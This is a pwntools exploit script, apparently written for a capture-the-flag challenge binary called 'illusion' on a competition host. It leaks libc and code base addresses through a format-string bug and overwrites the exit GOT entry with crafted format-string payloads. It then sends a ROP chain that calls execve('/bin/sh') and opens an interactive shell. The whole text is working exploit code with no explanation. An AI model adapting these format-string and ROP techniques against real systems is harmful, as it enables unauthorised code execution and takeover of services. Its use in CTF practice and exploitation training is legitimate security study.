#!/usr/bin/python3

from pwn import *
import sys

HOST = 'eofqual.zoolab.org'
#HOST = 'localhost'
PORT = 10104
BIN = './illusion'
LIBC = '../libc-2.31.so'

context.timeout = 3
context.arch = 'amd64'

e = ELF(BIN)
l = ELF(LIBC)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN, env={"LD_PRELOAD": LIBC})

r.sendlineafter('Hello, what is your name?\n', '%11$p%15$p')
r.recvuntil('Nice to meet you\n')
total = r.recvline()[:-1]
libc, code = total[:14], total[14:]
libc = int(libc, 16) - 0x270b3
code = int(code, 16) - 0x1211
system_ = libc + 0x55414
exit_got = code + 0x5018
puts_got = code + 0x5020
binsh = code + 0x5200
main = code + 0x1211
ret = code + 0x101a
log.info(f"libc: {hex(libc)}")
log.info(f"code: {hex(code)}")

pop_rcx_ret = 0x000000000009f822 + libc
pop_rdi_ret = 0x0000000000026b72 + libc
pop_rax_ret = 0x000000000004a550 + libc
pop_rsi_ret = 0x0000000000027529 + libc
pop_rdx_pop_rcx_pop_rbx_ret = 0x00000000001056fd + libc
mov_qword_ptr_rdi_rcx_ret = 0x00000000000ba056 + libc
syscall = 0x000000000002584d + libc

rop = flat(
    pop_rdx_pop_rcx_pop_rbx_ret,
    0,
    b'/bin/sh\x00',
    0,
    pop_rdi_ret,
    binsh,
    mov_qword_ptr_rdi_rcx_ret,
    pop_rax_ret,
    0x3b,
    pop_rsi_ret,
    0,
    syscall
)
"""
1. overwrite exit to hello
2. overwrite puts
3. input /bin/sh
"""
overwrite_exit_got = fmtstr_payload(6, {exit_got: main}, write_size='byte')
r.sendline(overwrite_exit_got)


overwrite_exit_got = fmtstr_payload(6, {exit_got: pop_rdi_ret}, write_size='byte')
r.sendline(overwrite_exit_got)
r.sendline(rop)
#r.sendline(b'/bin/sh\x00')

r.interactive()
